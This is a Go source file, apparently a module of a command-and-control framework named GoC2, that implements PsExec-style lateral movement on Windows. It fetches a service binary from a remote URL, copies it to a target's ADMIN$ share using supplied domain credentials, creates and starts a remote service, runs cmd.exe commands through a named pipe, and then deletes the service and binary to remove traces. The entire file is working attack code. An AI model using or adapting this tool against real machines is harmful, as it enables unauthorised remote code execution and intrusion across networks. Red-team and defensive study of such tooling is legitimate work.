//go:build windows
// +build windows

package exectools

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"syscall"
	"unsafe"

	"github.com/hirochachacha/go-smb2"
	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

func DownloadServiceBinary(remoteUrl string) ([]byte, error) {
	resp, err := http.Get(remoteUrl)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return data, nil
}

func PsExec(args []string) (string, error) {
	if len(args) < 5 {
		return "", errors.New("Not Enough Args.")
	}
	host := args[0]
	userName := args[1]
	userSlice := strings.Split(userName, "\\")
	if len(userSlice) < 2 {
		return "", errors.New("User Format Must Be DOMAIN\\User")
	}
	domainW := userSlice[0]
	userName = userSlice[1]
	password := args[2]
	urlOfServiceBin := args[3]
	serviceBinBytes, err := DownloadServiceBinary(urlOfServiceBin)
	if err != nil {
		return "", errors.New("Failed to download service binary.")
	}
	command := args[4]
	err = LogonUserToAccessSVM(domainW, userName, password)
	if err != nil {
		return "", err
	}
	if err := DropServiceBinary(domainW, userName, password, host, serviceBinBytes); err != nil {
		return "", err
	}
	if err := CreateServicePsExec(host, "GoPsExec"); err != nil {
		return "", err
	}
	if err := StartService(host, "GoPsExec"); err != nil {
		return "", err
	}
	hNamedPipe := ConnectToPipe(fmt.Sprintf("\\\\%s\\pipe\\slotty", host))
	if hNamedPipe == 0 {
		return "", errors.New("Couldnt connect to pipe")
	}
	WriteToPipeCommand(hNamedPipe, command)
	ok, commandOutput := ReadFromPipe(hNamedPipe)
	if !ok {
		return "", errors.New("[-] Failed to get response back from pipe")
	}
	windows.CloseHandle(windows.Handle(hNamedPipe))
	if err := StopService(host, "GoPsExec"); err != nil {
		return "", err
	}
	if err := DeleteServicePsExec(host, "GoPsExec"); err != nil {
		return "", err
	}
	if err := DeleteServiceBinary(domainW, userName, password, host); err != nil {
		return "", err
	}
	return commandOutput, nil
}

func ConnectToPipe(pipeName string) uintptr {
	winapi.WaitNamedPipe(pipeName, 0xffffffff)
	pipeHandle := winapi.CreateFile(pipeName, windows.GENERIC_WRITE|windows.GENERIC_READ, 0, 0, windows.OPEN_EXISTING, 0, 0)
	if pipeHandle == 0 {
		return 0
	}
	return pipeHandle
}

func ReadFromPipe(handleNamedPipe uintptr) (bool, string) {
	msg := Message{}
	commandResult := ""
	var stopReading bool
	var result string
	var bytesRead uint32
	var buffer [1028]byte
	// read from pipe until we dont need too anymore
	for {
		b := windows.ReadFile(windows.Handle(handleNamedPipe), buffer[:], &bytesRead, nil)
		if b != nil {
			return false, ""
		}
		msg.MessageType = binary.LittleEndian.Uint32(buffer[0:4])
		copy(msg.Data[:], buffer[:])
		stopReading, result = HandleResponse(msg)
		commandResult += result
		if stopReading {
			return true, commandResult
		} else {
			continue
		}
	}
}

func HandleResponse(msg Message) (bool, string) {
	result := ""
	for x := 4; x < 1024; x++ {
		if msg.Data[x : x+1][0] == 0 {
			break
		}
		result += string(msg.Data[x : x+1][0])
	}
	if msg.MessageType == 2 {
		return true, result
	}
	return false, result
}

func WriteToPipeCommand(handleNamedPipe uintptr, command string) bool {
	msg := Message{}
	msg.MessageType = 0
	copy(msg.Data[:], []byte(fmt.Sprintf("C:\\Windows\\system32\\cmd.exe /c %s", command)))
	var bytesWritten uint32
	results := winapi.WriteFile(syscall.Handle(handleNamedPipe), uintptr(unsafe.Pointer(&msg)), uint32(unsafe.Sizeof(msg)), &bytesWritten, 0)
	if !results {
		return false
	}
	return true
}

type Message struct {
	MessageType uint32
	Data        [1024]byte
}

func StopService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Control(svc.Stop)
	return nil
}
func StartService(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	service.Start()
	return nil
}
func DeleteServicePsExec(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	service, err := serviceMgr.OpenService(serviceName)
	if err != nil {
		return err
	}
	defer service.Close()
	err = service.Delete()
	if err != nil {
		return err
	}
	return nil
}
func CreateServicePsExec(targetMachine, serviceName string) error {
	serviceMgr, err := mgr.ConnectRemote(targetMachine)
	if err != nil {
		return err
	}
	defer serviceMgr.Disconnect()
	c := mgr.Config{}
	service, err := serviceMgr.CreateService(serviceName, "C:\\Windows\\GoPsExec.exe", c)
	if err != nil {
		return err
	}
	defer service.Close()
	return nil
}

func DeleteServiceBinary(domain, user, pass, targetMachine string) error {
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", targetMachine))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	var d *smb2.Dialer
	d = &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: pass,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return err
	}
	defer s.Logoff()
	share, err := s.Mount("ADMIN$")
	if err != nil {
		return err
	}
	defer share.Umount()
	err = share.Remove("GoPsExec.exe")
	if err != nil {
		return err
	}
	return nil
}

func DropServiceBinary(domain, user, pass, targetMachine string, serviceBinary []byte) error {
	// download binary
	conn, err := net.Dial("tcp", fmt.Sprintf("%s:445", targetMachine))
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	var d *smb2.Dialer
	d = &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			Domain:   domain,
			User:     user,
			Password: pass,
		},
	}
	s, err := d.Dial(conn)
	if err != nil {
		return err
	}
	defer s.Logoff()
	share, err := s.Mount("ADMIN$")
	if err != nil {
		return err
	}
	defer share.Umount()
	err = share.WriteFile("GoPsExec.exe", serviceBinary, 0644)
	if err != nil {
		return err
	}
	return nil
}
